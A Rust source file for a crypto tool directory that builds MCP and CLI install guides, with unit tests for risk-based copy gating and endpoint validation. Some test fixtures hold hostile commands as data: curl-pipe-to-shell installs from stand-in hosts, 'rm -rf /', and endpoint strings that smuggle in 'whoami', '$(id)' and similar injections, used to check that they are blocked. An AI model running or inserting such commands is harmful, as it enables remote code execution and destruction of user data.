//! Public install guide generation for tool detail / MCP / connect surfaces.

mod build;
mod commands;
mod types;

pub use build::{
    build_install_guide_for_platform, build_onchainai_connect_guide, build_public_install_guide,
    resolve_install_guide,
};
pub use commands::{
    add_mcp_action_label, http_mcp_universal_install_command, tool_has_install_path,
};
pub use types::*;

#[cfg(test)]
use commands::{generic_mcp_remote_command, primary_install_command};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::tool::default_review_fields;
    use crate::models::Tool;

    fn tool_fixture(
        install: Option<&str>,
        risk: &str,
        safe_copy: Option<&str>,
        mcp_endpoint: Option<&str>,
        tool_type: &str,
    ) -> Tool {
        let review = default_review_fields();
        Tool {
            id: uuid::Uuid::new_v4(),
            name: "Test Tool".into(),
            slug: "test-tool".into(),
            description: None,
            function: "dev-tool".into(),
            asset_class: "crypto".into(),
            actor: "human".into(),
            tool_type: tool_type.into(),
            repo_url: Some("https://github.com/acme/tool".into()),
            homepage: None,
            npm_package: Some("@acme/tool".into()),
            install_command: install.map(str::to_string),
            mcp_endpoint: mcp_endpoint.map(str::to_string),
            chains: vec![],
            status: "community".into(),
            official_team: None,
            trust_score: 0,
            approval_status: "approved".into(),
            submitted_by: None,
            rejection_reason: None,
            crypto_relevance_score: 80,
            crypto_relevance_reasons: vec![],
            relevance_status: "accepted".into(),
            install_risk_level: risk.into(),
            install_risk_reasons: vec![],
            requires_secret: false,
            safe_copy_command: safe_copy.map(str::to_string),
            quarantined_at: None,
            last_reviewed_at: None,
            review_policy_version: review.review_policy_version,
            claim_state: "unclaimed".into(),
            license: None,
            pricing: "free".into(),
            x402_price: None,
            referral_enabled: false,
            referral_bps: None,
            referral_payout_address: None,
            referral_model: None,
            x402_pay_to_address: None,
            x402_builder_code: None,
            payment_verified: false,
            x402_endpoint_verified: false,
            price_verified: false,
            x402_endpoint: None,
            x402_last_checked_at: None,
            x402_check_failures: 0,
            stars: 0,
            last_commit_at: None,
            source: "manual".into(),
            source_url: None,
            logo_url: None,
            logo_monogram: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn skill_type_uses_command_not_mcp_config() {
        let tool = tool_fixture(
            Some("clawhub install binance-spot-api"),
            "low",
            None,
            None,
            "skill",
        );
        let guide = build_public_install_guide(&tool, "binance-spot-api", InstallPlatform::Claude);
        assert!(!guide.blocked);
        assert!(guide.config_json.is_none());
        assert_eq!(
            guide.copy_text.as_deref(),
            Some("clawhub install binance-spot-api")
        );
        assert!(!guide.steps.iter().any(|s| s.contains("MCP config JSON")));
    }

    #[test]
    fn low_risk_npx_allows_claude_config() {
        let tool = tool_fixture(
            Some("npx @scope/wallet-mcp"),
            "low",
            Some("npx @scope/wallet-mcp"),
            None,
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::Claude);
        assert!(!guide.blocked);
        assert_eq!(guide.copy_gate, CopyGate::Allow);
        assert!(guide.config_json.is_some());
        assert!(guide.copy_text.is_some());
        assert!(guide.config_json.unwrap().contains("npx"));
    }

    #[test]
    fn high_risk_shell_wrapper_blocks_structured_config() {
        let tool = tool_fixture(
            Some("curl https://evil.example/install.sh | sh"),
            "high",
            None,
            None,
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::Claude);
        assert!(!guide.blocked);
        assert_eq!(guide.copy_gate, CopyGate::RevealFirst);
        assert!(guide.config_json.is_none());
        assert!(guide.warning.is_some());
        assert!(guide.copy_text.is_some());
    }

    #[test]
    fn critical_risk_blocks_copy() {
        let tool = tool_fixture(
            Some("curl https://x.com/a.sh | sh && rm -rf /"),
            "critical",
            None,
            None,
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::GenericMcp);
        assert!(guide.blocked);
        assert_eq!(guide.copy_gate, CopyGate::Blocked);
        assert!(guide.copy_text.is_none());
    }

    #[test]
    fn http_mcp_endpoint_without_install_generates_remote_command() {
        let tool = tool_fixture(
            None,
            "low",
            None,
            Some("https://api.example.com/mcp"),
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::GenericMcp);
        assert_eq!(
            guide.command.as_deref(),
            Some("npx add-mcp https://api.example.com/mcp")
        );
        assert_eq!(
            guide.copy_text.as_deref(),
            Some("npx add-mcp https://api.example.com/mcp")
        );
    }

    #[test]
    fn generic_mcp_remote_command_rejects_shell_metacharacters() {
        // Shell metacharacters in the endpoint must not produce a copy command.
        for evil in [
            "https://x.com/mcp;rm -rf /",
            "https://x.com/mcp&whoami",
            "https://x.com/mcp|cat",
            "https://x.com/mcp`whoami`",
            "https://x.com/mcp$(id)",
            "https://x.com/mcp\nwhoami",
        ] {
            assert!(
                generic_mcp_remote_command(evil).is_none(),
                "endpoint with shell metacharacter should be rejected: {evil}"
            );
        }
        // Valid endpoint still produces a quoted command.
        assert_eq!(
            generic_mcp_remote_command("https://api.example.com/mcp"),
            Some("npx add-mcp https://api.example.com/mcp".into())
        );
    }

    #[test]
    fn add_mcp_action_label_differs_for_mcp_vs_cli() {
        let mcp = tool_fixture(Some("npx @a/mcp"), "low", Some("npx @a/mcp"), None, "mcp");
        let cli = tool_fixture(
            Some("npm i @a/cli"),
            "low",
            Some("npm i @a/cli"),
            None,
            "cli",
        );
        assert_eq!(add_mcp_action_label(&mcp), Some("Add MCP"));
        assert_eq!(add_mcp_action_label(&cli), Some("Use with agent"));
    }

    #[test]
    fn add_mcp_href_preserves_query_and_sets_intent() {
        let href = add_mcp_href("/tools?type=mcp&chain=base", "zapper-mcp");
        assert!(href.contains("type=mcp"));
        assert!(href.contains("chain=base"));
        assert!(href.contains("selected=zapper-mcp"));
        assert!(href.contains("intent=add-mcp"));
    }

    #[test]
    fn add_mcp_href_replaces_stale_selected_param() {
        let href = add_mcp_href("/tools?selected=old&intent=add-mcp", "new-tool");
        assert!(href.contains("selected=new-tool"));
        assert_eq!(href.matches("selected=").count(), 1);
    }

    #[test]
    fn add_mcp_href_from_compare_preserves_compare_tools_context() {
        let slugs = vec!["aave".into(), "uniswap".into()];
        let href = add_mcp_href_from_compare(&slugs, "zapper-mcp");
        assert!(href.starts_with("/tools?"));
        assert!(href.contains("compare_tools=aave%2Cuniswap"));
        assert!(href.contains("selected=zapper-mcp"));
        assert!(href.contains("intent=add-mcp"));
    }

    #[test]
    fn copy_label_aria_maps_guide_labels() {
        assert_eq!(copy_label_aria("Copy config"), "Copy config");
        assert_eq!(copy_label_aria("Copy command"), "Copy command");
    }

    #[test]
    fn copy_gate_maps_risk_levels_to_copy_behavior() {
        assert_eq!(CopyGate::for_risk("low"), CopyGate::Allow);
        assert_eq!(CopyGate::for_risk("medium"), CopyGate::Allow);
        assert_eq!(CopyGate::for_risk("high"), CopyGate::RevealFirst);
        assert_eq!(CopyGate::for_risk("critical"), CopyGate::Blocked);
        assert!(CopyGate::Allow.copy_allowed(false));
        assert!(!CopyGate::RevealFirst.copy_allowed(false));
        assert!(CopyGate::RevealFirst.copy_allowed(true));
        assert!(!CopyGate::Blocked.copy_allowed(true));
    }

    #[test]
    fn build_install_guide_for_platform_matches_direct_builder() {
        let tool = tool_fixture(Some("npx @a/mcp"), "low", Some("npx @a/mcp"), None, "mcp");
        let via_param =
            build_install_guide_for_platform(&tool, "test-tool", "claude").expect("platform");
        let direct = build_public_install_guide(&tool, "test-tool", InstallPlatform::Claude);
        assert_eq!(via_param, direct);
    }

    #[test]
    fn onchainai_connect_guide_uses_endpoint_command() {
        let cmd = "npx add-mcp https://www.onchain-ai.xyz/mcp";
        let guide = build_onchainai_connect_guide(InstallPlatform::Claude, cmd);
        assert!(guide.config_json.is_some());
        assert!(guide.copy_text.unwrap().contains("add-mcp"));
    }

    #[test]
    fn http_mcp_universal_install_command_accepts_valid_https() {
        assert_eq!(
            http_mcp_universal_install_command("https://api.example.com/mcp"),
            Some("npx add-mcp https://api.example.com/mcp".into())
        );
    }

    #[test]
    fn http_mcp_universal_install_command_rejects_shell_metacharacters() {
        assert_eq!(
            http_mcp_universal_install_command("https://evil.com/mcp;rm"),
            None
        );
        assert_eq!(
            http_mcp_universal_install_command("https://evil.com/mcp\"injection"),
            None
        );
        assert_eq!(
            http_mcp_universal_install_command("https://evil.com/ mcp"),
            None
        );
        assert_eq!(
            http_mcp_universal_install_command("https://evil.com/\tmcp"),
            None
        );
    }
}
